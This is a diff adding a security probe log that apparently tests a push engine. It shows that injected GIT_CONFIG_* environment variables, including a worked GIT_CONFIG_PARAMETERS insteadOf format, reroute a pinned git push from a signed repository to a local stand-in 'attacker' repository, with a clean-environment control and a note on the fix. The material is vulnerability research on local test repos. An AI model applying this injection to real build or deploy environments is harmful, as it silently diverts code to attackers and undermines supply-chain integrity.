@@ -1,0 +1,86 @@
+setup: src=/tmp/r2a2-env-probes-04igzrgg/src sha=840b3258e3c816d6285207fd79455cee346d131a
+       staging=/tmp/r2a2-env-probes-04igzrgg/staging.git (alternates -> src objects only)
+       signed=/tmp/r2a2-env-probes-04igzrgg/signed.git  attacker=/tmp/r2a2-env-probes-04igzrgg/attacker.git
+
+=== EP1: ARBITER POC, raw git — GIT_CONFIG_COUNT injection, NOSYSTEM=1 + GLOBAL=/dev/null armed
+$ git --git-dir /tmp/r2a2-env-probes-04igzrgg/staging.git push -- /tmp/r2a2-env-probes-04igzrgg/signed.git 840b3258e3c816d6285207fd79455cee346d131a:refs/heads/main   env=['GIT_CONFIG_COUNT', 'GIT_CONFIG_GLOBAL', 'GIT_CONFIG_KEY_0', 'GIT_CONFIG_NOSYSTEM', 'GIT_CONFIG_VALUE_0']
+  exit=0
+  stderr: To /tmp/r2a2-env-probes-04igzrgg/attacker.git
+           * [new branch]      840b3258e3c816d6285207fd79455cee346d131a -> main
+  | destination        | result
+  | signed repo        | branch main = (none); has commit 840b3258: False
+  | attacker repo      | branch main = 840b3258e3c816d6285207fd79455cee346d131a; has commit 840b3258: True; object count = 3
+[EP1] VULNERABLE (OBSERVED): attacker received the commit and the signed repo did NOT — env-config injection reroutes even an explicit-URL push from an alternates-only staging repo under NOSYSTEM+GLOBAL=/dev/null (matches the arbitration reproduction table)
+
+=== EP2a: GIT_CONFIG_PARAMETERS accepted-format discovery
+$ git config --get-all url./tmp/r2a2-env-probes-04igzrgg/attacker.git.insteadOf   env=['GIT_CONFIG_COUNT', 'GIT_CONFIG_KEY_0', 'GIT_CONFIG_VALUE_0']
+  exit=0
+  stdout: /tmp/r2a2-env-probes-04igzrgg/signed.git
+  -> positive control (GIT_CONFIG_COUNT): accepted=True
+$ git config --get-all url./tmp/r2a2-env-probes-04igzrgg/attacker.git.insteadOf   env=['GIT_CONFIG_PARAMETERS']
+  exit=0
+  stdout: /tmp/r2a2-env-probes-04igzrgg/signed.git
+  -> old-style sq-quoted 'key=value': accepted=True
+$ git config --get-all url./tmp/r2a2-env-probes-04igzrgg/attacker.git.insteadOf   env=['GIT_CONFIG_PARAMETERS']
+  exit=0
+  stdout: /tmp/r2a2-env-probes-04igzrgg/signed.git
+  -> new-style sq-quoted "'key'='value'": accepted=True
+$ git config --get-all url./tmp/r2a2-env-probes-04igzrgg/attacker.git.insteadOf   env=['GIT_CONFIG_PARAMETERS']
+  exit=128
+  stderr: error: bogus format in GIT_CONFIG_PARAMETERS
+          fatal: unable to parse command-line config
+  -> flat JSON array of strings (pairwise): accepted=False
+$ git config --get-all url./tmp/r2a2-env-probes-04igzrgg/attacker.git.insteadOf   env=['GIT_CONFIG_PARAMETERS']
+  exit=128
+  stderr: error: bogus format in GIT_CONFIG_PARAMETERS
+          fatal: unable to parse command-line config
+  -> JSON array of 2-element arrays: accepted=False
+  WORKING FORMAT: old-style sq-quoted 'key=value' -> 'url./tmp/r2a2-env-probes-04igzrgg/attacker.git.insteadOf=/tmp/r2a2-env-probes-04igzrgg/signed.git'
+  (source-cited grammar: git v2.47.3 config.c:669-719; JSON forms are bogus format, verified)
+
+=== EP2: same PoC via GIT_CONFIG_PARAMETERS (discovered format)
+$ git --git-dir /tmp/r2a2-env-probes-04igzrgg/staging.git push -- /tmp/r2a2-env-probes-04igzrgg/ep2-signed.git 840b3258e3c816d6285207fd79455cee346d131a:refs/heads/main   env=['GIT_CONFIG_GLOBAL', 'GIT_CONFIG_NOSYSTEM', 'GIT_CONFIG_PARAMETERS']
+  exit=0
+  stderr: To /tmp/r2a2-env-probes-04igzrgg/ep2-attacker.git
+           * [new branch]      840b3258e3c816d6285207fd79455cee346d131a -> main
+  | destination        | result
+  | signed repo        | branch main = (none); has commit 840b3258: False
+  | attacker repo      | branch main = 840b3258e3c816d6285207fd79455cee346d131a; has commit 840b3258: True; object count = 3
+[EP2] VULNERABLE (OBSERVED): same reroute through GIT_CONFIG_PARAMETERS (format: old-style sq-quoted 'key=value')
+
+=== EP3: CURRENT shipped eoe.push_engine.staged_push — hostile variables planted in the CALLING PROCESS os.environ
+staged_push -> returncode=0
+  argv: ['git', '--git-dir=/tmp/r2a1-staged-push-qpbffkx5', 'push', '--', '/tmp/r2a2-env-probes-04igzrgg/ep3-signed.git', '840b3258e3c816d6285207fd79455cee346d131a:refs/heads/main']
+  stderr: To /tmp/r2a2-env-probes-04igzrgg/ep3-attacker.git
+ * [new branch]      840b3258e3c816d6285207fd79455cee346d131a -> main
+  | destination        | result
+  | signed repo        | branch main = (none); has commit 840b3258: False
+  | attacker repo      | branch main = 840b3258e3c816d6285207fd79455cee346d131a; has commit 840b3258: True; object count = 3
+[EP3] VULNERABLE (OBSERVED): the ENGINE's own shipped pinned-destination push is rerouted by inherited GIT_CONFIG_* — the R2A2 accreditation blocker
+
+=== EP4: control — identical push, clean environment
+$ git --git-dir /tmp/r2a2-env-probes-04igzrgg/staging.git push -- /tmp/r2a2-env-probes-04igzrgg/signed3.git 840b3258e3c816d6285207fd79455cee346d131a:refs/heads/main   env=['BUN_INSTALL', 'BUN_INSTALL_BIN', 'BUN_RUNTIME_TRANSPILER_CACHE_PATH', 'CLAWHUB_DISABLE_TELEMETRY', 'CLAWHUB_WORKDIR', 'CLICOLOR', 'CLICOLOR_FORCE', 'DATABASE_URL', 'DEBIAN_FRONTEND', 'FC_ACCOUNT_ID', 'FC_CONTAINER_ID', 'FC_CUSTOM_LISTEN_PORT', 'FC_FUNCTION_HANDLER', 'FC_FUNCTION_MEMORY_SIZE', 'FC_FUNCTION_NAME', 'FC_INSTANCE_ID', 'FC_REGION', 'GIT_CONFIG_GLOBAL', 'GIT_CONFIG_NOSYSTEM', 'HOME', 'KATA_CONTAINER', 'LC_CTYPE', 'LOGNAME', 'MAIL', 'NO_COLOR', 'OLDPWD', 'PATH', 'PWD', 'PYTHONDONTWRITEBYTECODE', 'PYTHONUNBUFFERED', 'R2A2_PROBE_OUT', 'SHELL', 'SHLVL', 'SIGMA_APP_NAME', 'STEP_START_TIME', 'TERM', 'USER', 'UV', 'UV_CACHE_DIR', 'UV_PYTHON', 'UV_RUN_RECURSION_DEPTH', 'VIRTUAL_ENV', '_']
+  exit=0
+  stderr: To /tmp/r2a2-env-probes-04igzrgg/signed3.git
+           * [new branch]      840b3258e3c816d6285207fd79455cee346d131a -> main
+  | destination        | result
+  | signed repo        | branch main = 840b3258e3c816d6285207fd79455cee346d131a; has commit 840b3258: True
+  | attacker repo      | branch main = (none); has commit 840b3258: False; object count = 0
+[EP4] PASS: with a clean environment the identical push lands ONLY at the signed repo — the setup is sound; the difference in EP1..EP3 is the inherited environment
+
+=== EP5: GIT_CONFIG_SYSTEM — channel liveness vs shipped behavior
+$ git --git-dir /tmp/r2a2-env-probes-04igzrgg/staging.git push -- /tmp/r2a2-env-probes-04igzrgg/ep5-signed.git 840b3258e3c816d6285207fd79455cee346d131a:refs/heads/main   env=['GIT_CONFIG_GLOBAL', 'GIT_CONFIG_SYSTEM']
+  exit=0
+  stderr: To /tmp/r2a2-env-probes-04igzrgg/ep5-attacker.git
+           * [new branch]      840b3258e3c816d6285207fd79455cee346d131a -> main
+  | destination        | result
+  | signed repo        | branch main = (none); has commit 840b3258: False
+  | attacker repo      | branch main = 840b3258e3c816d6285207fd79455cee346d131a; has commit 840b3258: True; object count = 3
+[EP5a] CHANNEL LIVE (OBSERVED): with NOSYSTEM unset, an inherited GIT_CONFIG_SYSTEM pointing at an attacker config reroutes the push — the channel exists at git level whenever NOSYSTEM is not armed
+staged_push -> returncode=0
+  | destination        | result
+  | signed repo        | branch main = 840b3258e3c816d6285207fd79455cee346d131a; has commit 840b3258: True
+  | attacker repo      | branch main = (none); has commit 840b3258: False; object count = 0
+[EP5b] neutralized by accident: the shipped push is NOT rerouted through this channel — but only because GIT_CONFIG_NOSYSTEM=1 happens to suppress the system-config source; the fix must pin GIT_CONFIG_SYSTEM explicitly instead of relying on this precedence
+
+=== PROBE SUMMARY: see [EP*] lines above. Pre-fix state = 74c8ec1 source + this uncommitted probe script only.
